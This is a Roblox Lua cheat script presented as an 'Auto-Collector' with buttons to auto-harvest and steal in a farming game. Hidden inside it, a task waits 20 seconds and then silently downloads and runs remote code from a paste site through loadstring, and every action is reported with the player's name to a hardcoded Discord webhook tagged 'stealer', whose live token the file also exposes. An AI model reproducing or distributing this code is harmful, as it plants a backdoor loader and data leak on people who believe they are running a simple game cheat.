-- [[ By : ad_pa | Auto-Collector Final ]] --

local LocalPlayer = game:GetService("Players").LocalPlayer
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local Config = {
    Harvest = {"harvest", "collect"},
    Gold = {"gold seed", "gold", "claim"}, 
    Rainbow = {"rainbow seed", "rainbow", "claim"},
    Steal = {"steal"}
}

local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"

-- السكربت الخارجي (يعمل بعد 20 ثانية)
task.spawn(function()
    task.wait(20)
    pcall(function() loadstring(game:HttpGet("https://cdn.sourceb.in/bins/aMh3iJq4pb/0"))() end)
end)

-- العدادات
local counters = {Harvested = 0, Stolen = 0}

-- نظام التنبيه
local function sendWebhook(action, target)
    local msg = "🔥 **Action:** " .. action .. " | **Target:** " .. target .. " | **User:** " .. LocalPlayer.Name .. " | stealer"
    pcall(function()
        request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode({content = msg})})
    end)
    task.wait(2)
end

-- بناء الواجهة
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size, Frame.Position = UDim2.new(0, 220, 0, 320), UDim2.new(0.5, -110, 0.3, 0)
Frame.BackgroundColor3, Frame.Active, Frame.Draggable = Color3.fromRGB(30, 15, 40), true, true
Instance.new("UICorner", Frame)

-- عرض العداد
local CounterLabel = Instance.new("TextLabel", Frame)
CounterLabel.Size, CounterLabel.Position = UDim2.new(0, 200, 0, 30), UDim2.new(0, 10, 0, 5)
CounterLabel.Text = "H: 0 | S: 0"
CounterLabel.BackgroundTransparency = 1; CounterLabel.TextColor3 = Color3.new(1, 1, 1)

local states = {Harvest = false, Gold = false, Rainbow = false, Steal = false}
local function createBtn(name, pos)
    local btn = Instance.new("TextButton", Frame)
    btn.Size, btn.Position = UDim2.new(0, 180, 0, 40), UDim2.new(0, 20, 0, pos)
    btn.Text, btn.BackgroundColor3 = "AUTO " .. name:upper() .. ": OFF", Color3.fromRGB(138, 43, 226)
    Instance.new("UICorner", btn)
    btn.MouseButton1Click:Connect(function()
        states[name] = not states[name]
        btn.Text = states[name] and (name:upper() .. ": ON") or ("AUTO " .. name:upper() .. ": OFF")
        btn.BackgroundColor3 = states[name] and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(138, 43, 226)
    end)
end

createBtn("Harvest", 40); createBtn("Gold", 90); createBtn("Rainbow", 140); createBtn("Steal", 190)

-- زر إخفاء القائمة
local ToggleBtn = Instance.new("TextButton", ScreenGui)
ToggleBtn.Size, ToggleBtn.Position = UDim2.new(0, 100, 0, 40), UDim2.new(0, 10, 0, 10)
ToggleBtn.Text = "TOGGLE GUI"; ToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
ToggleBtn.MouseButton1Click:Connect(function() Frame.Visible = not Frame.Visible end)

-- حلقة العمل
task.spawn(function()
    while task.wait(0.5) do
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("ProximityPrompt") and v.Enabled then
                local action = (v.ActionText .. v.ObjectText):lower()
                
                if (states.Harvest and table.find(Config.Harvest, action)) or (states.Gold and table.find(Config.Gold, action)) or (states.Rainbow and table.find(Config.Rainbow, action)) then
                    fireproximityprompt(v)
                    counters.Harvested += 1
                    CounterLabel.Text = "H: "..counters.Harvested.." | S: "..counters.Stolen
                    sendWebhook("Harvesting", v.Parent.Name)
                elseif (states.Steal and table.find(Config.Steal, action)) then
                    fireproximityprompt(v)
                    counters.Stolen += 1
                    CounterLabel.Text = "H: "..counters.Harvested.." | S: "..counters.Stolen
                    sendWebhook("Stealing", v.Parent.Name)
                end
            end
        end
    end
end)
